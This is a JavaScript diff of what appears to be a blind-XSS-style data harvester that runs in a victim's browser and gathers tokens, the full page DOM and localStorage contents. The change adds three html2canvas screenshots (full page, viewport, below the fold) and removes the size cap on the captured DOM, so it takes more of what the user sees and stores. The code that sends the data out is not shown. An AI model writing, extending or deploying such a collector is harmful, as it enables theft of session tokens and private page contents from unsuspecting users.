@@ -22,20 +22,90 @@
     } catch (e) { }
   }
 
-  function screenshot() {
-    if (typeof html2canvas === "undefined") return Promise.resolve("");
-    return html2canvas(document.querySelector("html"), {
-      letterRendering: 1,
-      allowTaint: true,
-      useCORS: true,
-      width: 1024,
-      height: 768,
-    })
-      .then(function (canvas) {
-        return canvas.toDataURL(); // png in dataURL format
+  function captureScreenshots() {
+    if (typeof html2canvas === "undefined") return Promise.resolve([]);
+
+    var results = [];
+    var docW = Math.max(document.documentElement.scrollWidth, document.body.scrollWidth, window.innerWidth);
+    var docH = Math.max(document.documentElement.scrollHeight, document.body.scrollHeight, window.innerHeight);
+    var vpW = window.innerWidth || document.documentElement.clientWidth;
+    var vpH = window.innerHeight || document.documentElement.clientHeight;
+
+    // Screenshot 1: Full page (actual document size, capped at 4096px to avoid memory issues)
+    function captureFullPage() {
+      return html2canvas(document.documentElement, {
+        letterRendering: 1,
+        allowTaint: true,
+        useCORS: true,
+        width: Math.min(docW, 4096),
+        height: Math.min(docH, 4096),
+        windowWidth: docW,
+        windowHeight: docH,
+        scrollX: 0,
+        scrollY: 0,
+        x: 0,
+        y: 0
+      }).then(function (canvas) {
+        results.push(canvas.toDataURL("image/png"));
+      }).catch(function () {
+        results.push("");
+      });
+    }
+
+    // Screenshot 2: Current viewport (what the user actually sees)
+    function captureViewport() {
+      var scrollX = window.pageXOffset || document.documentElement.scrollLeft;
+      var scrollY = window.pageYOffset || document.documentElement.scrollTop;
+      return html2canvas(document.documentElement, {
+        letterRendering: 1,
+        allowTaint: true,
+        useCORS: true,
+        width: vpW,
+        height: vpH,
+        windowWidth: vpW,
+        windowHeight: vpH,
+        scrollX: scrollX,
+        scrollY: scrollY,
+        x: scrollX,
+        y: scrollY
+      }).then(function (canvas) {
+        results.push(canvas.toDataURL("image/png"));
+      }).catch(function () {
+        results.push("");
+      });
+    }
+
+    // Screenshot 3: Below the fold (scroll down and capture)
+    function captureBelowFold() {
+      if (docH <= vpH) return Promise.resolve(); // Page fits in viewport, skip
+      var belowY = Math.min(vpH, docH - vpH);
+      return html2canvas(document.documentElement, {
+        letterRendering: 1,
+        allowTaint: true,
+        useCORS: true,
+        width: Math.min(docW, 4096),
+        height: vpH,
+        windowWidth: vpW,
+        windowHeight: vpH,
+        scrollX: 0,
+        scrollY: belowY,
+        x: 0,
+        y: belowY
+      }).then(function (canvas) {
+        results.push(canvas.toDataURL("image/png"));
+      }).catch(function () {
+        results.push("");
+      });
+    }
+
+    return captureFullPage()
+      .then(captureViewport)
+      .then(captureBelowFold)
+      .then(function () {
+        return results.filter(function (r) { return r && r.length > 0; });
       })
       .catch(function () {
-        return "";
+        return results.filter(function (r) { return r && r.length > 0; });
       });
   }
 
@@ -101,14 +171,7 @@
         return tokens.length > 0 ? tokens.join("\n") : "None found";
       },
       DOM: function () {
-        return document.documentElement.outerHTML
-          .toString()
-          .replace(/\n/g, "")
-          .replace(/[\t ]+</g, "<")
-          .replace(/>[\t ]+</g, "><")
-          .replace(/>[\t ]+$/g, ">")
-          .replace("`", "")
-          .slice(0, 8192);
+        return document.documentElement.outerHTML || "";
       },
       localStorage: function () {
         try { return JSON.stringify(localStorage); } catch (e) { return ""; }
@@ -178,10 +241,10 @@
           setTimeout(function () { resolve("timeout"); }, 8000);
         });
       },
-      Screenshot: function () {
-        return screenshot();
-      },
     };
+
+    // Capture screenshots separately (cached, only runs once)
+    var screenshotPromise = captureScreenshots();
 
     return Promise.all(
       Object.keys(collectedData).map(function (key) {
@@ -193,9 +256,16 @@
           collectedData[key] = "";
           return Promise.resolve();
         }
-      })
+      }).concat([screenshotPromise])
     ).then(function () {
-      return collectedData;
+      var shots = [];
+      try { shots = screenshotPromise.__result || []; } catch (e) { }
+      return screenshotPromise.then(function (s) {
+        shots = s || [];
+        collectedData["Screenshot"] = shots.length > 0 ? shots[0] : "";
+        collectedData["Screenshots"] = shots;
+        return collectedData;
+      });
     });
   }
 
